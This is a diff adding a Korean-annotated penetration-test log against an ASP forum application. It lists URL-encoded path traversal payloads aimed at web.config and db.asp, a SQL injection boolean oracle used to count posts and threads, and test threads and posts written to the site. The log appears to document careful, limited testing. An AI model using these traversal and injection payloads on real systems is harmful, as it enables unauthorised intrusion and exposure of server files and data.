@@ -1,0 +1,40 @@
+### B0. webroot 확정 오라클 (읽기 전용)
+..%2f..%2finetpub%2facuforum%2fdb.asp              500 1208
+..%2f..%2finetpub%2facuforum%2fweb.config          500 1208
+..%2facuforum%2fdb.asp                             500 1208
+..%2fwwwroot%2facuforum%2fdb.asp                   500 1208
+
+### B1. 세션 (따옴표 없는 uname) + SQLi 오라클로 전역 카운트 측정
+세션 사용자명: logout admin
+총 게시글 수(= TRUE 오라클 렌더 행수): 3
+COUNT(posts)>100  → rows(TRUE면 전체 행) = 0  ⇒ FALSE=임계값미달
+COUNT(threads)>100 → rows = 0
+COUNT(threads WHERE forumid=0)>100 → rows = 0
+COUNT(posts WHERE threadid=0)>100   → rows = 0
+
+### B2. BEFORE 스냅샷 (다른 콘텐츠가 변하지 않았음을 나중에 비교)
+200 3488  Default.asp
+200 5632  forum0
+200 4143  forum1
+200 4417  thread0
+200 4409  thread2
+b_before_default.html
+b_before_forum0.html
+b_before_forum1.html
+b_before_thread0.html
+b_before_thread2.html
+forum0 스레드 링크 id 목록: 0 1 2 3 4 5 6 7 8 
+
+### B3. 우리 소유 테스트 스레드 생성 (showforum.asp?id=0 POST) — 쓰기 1
+code=200 size=5811
+HTTP/1.1 200 OK
+
+### B4. 생성 확인 + 우리 스레드 id 식별
+200 5811  forum0
+forum0 최대 thread id: 9
+  우리 스레드 제목 매칭 수: 1
+  ★ 우리 스레드 id = 9 (제목 매칭 3)
+
+### B5. 우리 스레드에 게시글 1건 추가 (showthread.asp?id=9 POST) — 쓰기 2
+code=200 size=4531
+200 4531  우리 스레드 게시글 수: 1
